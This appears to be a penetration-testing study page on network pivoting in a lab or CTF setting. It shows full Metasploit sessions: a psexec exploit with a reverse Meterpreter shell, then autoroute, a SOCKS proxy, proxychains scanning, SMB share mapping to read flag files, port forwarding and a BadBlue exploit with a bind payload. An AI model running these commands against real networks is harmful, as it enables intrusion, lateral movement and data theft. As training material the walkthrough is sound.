---
layout: default
title: Pivoting
parent: Shells
nav_order: 5
---

# Pivoting

---

## Pivoting with Autoroute

There are two target machines:

1. Primary: 10.4.21.236
2. Secondary: 10.4.25.206

We can access the Primary target, but will need to use pivoting to access the Secondary target.

Gain initial access to the Primary target using Metasploit PsExec exploit.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ msfconsole -q
msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.4.21.236
RHOSTS => 10.4.21.236
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
SMBUser => administrator
msf6 exploit(windows/smb/psexec) > set SMBPass password1
SMBPass => password1
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.80.3:4444
[*] 10.4.21.236:445 - Connecting to the server...
[*] 10.4.21.236:445 - Authenticating to 10.4.21.236:445 as user 'administrator'...
[*] 10.4.21.236:445 - Selecting PowerShell target
[*] 10.4.21.236:445 - Executing the payload...
[+] 10.4.21.236:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.4.21.236
[*] Meterpreter session 1 opened (10.10.80.3:4444 -> 10.4.21.236:49241 ) at 2023-11-30 10:07:15 +0530

```

We can demonstrate the ability to ping the Secondary target from the Primary target

```bash
C:\Windows\system32>ping 10.4.25.206
ping 10.4.25.206

Pinging 10.4.25.206 with 32 bytes of data:
Reply from 10.4.25.206: bytes=32 time<1ms TTL=128
Reply from 10.4.25.206: bytes=32 time<1ms TTL=128
Reply from 10.4.25.206: bytes=32 time<1ms TTL=128
Reply from 10.4.25.206: bytes=32 time<1ms TTL=128

```

First, we use _autoroute_ within the Meterpreter session to add the route to the Secondary target.

Be sure to set the IP address as the Secondary target with the proper subnet mask
{: .warn}

```bash
meterpreter > run autoroute -s 10.4.25.206/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.4.25.206/255.255.240.0...
[+] Added route to 10.4.25.206/255.255.240.0 via 10.4.21.236
[*] Use the -p option to list all active routes

```

Next, we start the _socks4a_ server using Metasploit module _socks_proxy_.

```bash
# background the session
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/smb/psexec) >

# use the module socks_proxy module
msf6 exploit(windows/smb/psexec) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
VERSION => 4a
msf6 auxiliary(server/socks_proxy) > exploit
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy


```

We can demonstrate that we can reach the open ports of the Secondary target now using the Metasploit module _/auxiliary/scanner/portscan/tcp_

```bash
msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.4.25.206
RHOSTS => 10.4.25.206
msf6 auxiliary(scanner/portscan/tcp) > exploit

[+] 10.4.25.206:          - 10.4.25.206:135 - TCP OPEN
[+] 10.4.25.206:          - 10.4.25.206:139 - TCP OPEN
[+] 10.4.25.206:          - 10.4.25.206:445 - TCP OPEN

```

Finally, we can use _proxychains_ to access the Secondary target by pivoting through our _autoroute_ configuration on the Primary target.

Note: The support for proxy with nmap is very limited. Especially you cannot do any kind of ICMP (ping) or UDP scans, no SYN stealth scan, no OS detection etc. This means that the default nmap commands you are using will not work with a proxy and depending on the implementation will either fail or will bypass the proxy. You have to limit yourself to only the kind of scanning which is supported through proxies, i.e. simple TCP connections.
{: .warn }

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ proxychains nmap 10.4.25.206 -Pn -sT -sV -p445
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-30 10:31 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.25.206:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.25.206:445  ...  OK

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds
```

Let's try to access the SMB share on the Secondary Target

```bash
meterpreter > shell
Process 2144 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net view 10.4.25.206
net view 10.4.25.206
System error 5 has occurred.

Access is denied.

```

We receive an error and have to migrate the process.

```bash
meterpreter > migrate -N explorer.exe
[*] Migrating from 1892 to 2560...
[*] Migration completed successfully.
meterpreter > shell
Process 1796 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net view 10.4.25.206
net view 10.4.25.206
Shared resources at 10.4.25.206



Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
Documents   Disk
K           Disk
The command completed successfully.

```

Now we can use the _net view_ command to add the remote shares on the Secondary target

```bash
C:\Windows\system32>net view 10.4.25.206
net view 10.4.25.206
Shared resources at 10.4.25.206



Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
Documents   Disk
K           Disk
The command completed successfully.


C:\Windows\system32>net use D: \\10.4.25.206\Documents
net use D: \\10.4.25.206\Documents
The command completed successfully.


C:\Windows\system32>net use K: \\10.4.25.206\K$
net use K: \\10.4.25.206\K$
The command completed successfully.
```

And finally we can access the mapped shares with the _dir_ command and the Drive letter mapped

```bash
C:\Windows\system32>dir D:
dir D:
 Volume in drive D has no label.
 Volume Serial Number is 5CD6-020B

 Directory of D:\

01/04/2022  05:22 AM    <DIR>          .
01/04/2022  05:22 AM    <DIR>          ..
01/04/2022  05:07 AM             1,425 Confidential.txt
01/04/2022  05:22 AM                70 FLAG2.txt
               2 File(s)          1,495 bytes
               2 Dir(s)   6,597,632,000 bytes free

C:\Windows\system32>dir K:
dir K:
 Volume in drive K is New Volume
 Volume Serial Number is E654-107F

 Directory of K:\

11/17/2021  03:34 PM           327,590 wallpaper.png
               1 File(s)        327,590 bytes
               0 Dir(s)  10,951,335,936 bytes free

```

## Autoroute Example 2 with Arpscanner

We have a Meterpreter shell on a target and use _Arpscanner_ to locate additional machines on the network.

First we locate other networks using _ipconfig_

```bash
meterpreter > ipconfig


Interface 17
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:2c:70:e4
MTU          : 1500
IPv4 Address : 10.100.40.100
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::1020:455b:7b7e:f602
IPv6 Netmask : ffff:ffff:ffff:ffff::

```

Now we can use _arpscanner_ to look for live hosts on the 10.100.40.0/24 network.

```bash
meterpreter > run arp_scanner -r 10.100.40.0/24
[*] ARP Scanning 10.100.40.0/24
[*] IP: 10.100.40.100 MAC 08:00:27:2c:70:e4
[*] IP: 10.100.40.107 MAC 08:00:27:46:4d:f6

```

Now we can add a route to the session to launch further attacks on the newly discovered host 10.100.40.107

```bash
meterpreter > run autoroute -s 10.100.40.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.100.40.0/255.255.255.0...
[+] Added route to 10.100.40.0/255.255.255.0 via 172.16.5.10
[*] Use the -p option to list all active routes

```

We have added the route and can now use the auxiliary port scanner module.

This shows several open ports, including port 80, on the target machine.

```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/script/web_delivery) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.100.40.107
RHOSTS => 10.100.40.107
msf6 auxiliary(scanner/portscan/tcp) > exploit

[+] 10.100.40.107:        - 10.100.40.107:80 - TCP OPEN
[+] 10.100.40.107:        - 10.100.40.107:139 - TCP OPEN
[+] 10.100.40.107:        - 10.100.40.107:135 - TCP OPEN

```

We can now use _portfwd_ to forward the remote port 80 to the local port 1234.

```bash
msf6 auxiliary(scanner/portscan/tcp) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > portfwd add -l 1234 -p 80 -r 10.100.40.107
[*] Local TCP relay created: :1234 <-> 10.100.40.107:80
meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local             Remote        Direction
   -----  -----             ------        ---------
   1      10.100.40.107:80  0.0.0.0:1234  Forward

1 total active port forwards.
```

We have forwarded the remote port 80 to local port 1234.

Now we can scan this remote port 80 as 1234 using nmap.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ nmap -sC -sV -p 1234 localhost

Nmap scan report for localhost (127.0.0.1)
Host is up (0.000084s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
1234/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```

Badblue exploit would allow access using Metasploit module _exploit/windows/http/badblue_passthru_

Note: when an endpoint is not directly accessible (remote network being accessed via pivoting) we cannot use _reverse_tcp_ payload.

Instead, we have to use the _bind_tcp_ payload

```bash
use exploit/windows/http/badblue_passthru
set RHOSTS 10.100.40.107
set PAYLOAD windows/meterpreter/bind_tcp
exploit
getuid
sysinfo
```
